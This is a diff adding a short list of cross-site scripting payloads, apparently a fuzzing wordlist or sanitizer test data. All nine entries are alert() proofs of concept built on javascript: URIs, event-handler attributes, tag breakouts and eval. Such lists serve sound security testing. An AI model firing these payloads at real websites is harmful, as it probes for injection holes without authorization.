@@ -1,0 +1,9 @@
+jaVasCript:alert(1)
+"><img src=x onerror=alert(1)>
+';alert(String.fromCharCode(88,83,83));//
+<svg onload=alert(1)>
+" autofocus onfocus="alert(1)
+<iframe src="javascript:alert(1)"></iframe>
+<body onload=alert(1)>
+<marquee onstart=alert(1)></marquee>
+<img src=x:alert(alt) onerror="eval(src)" alt=xss>
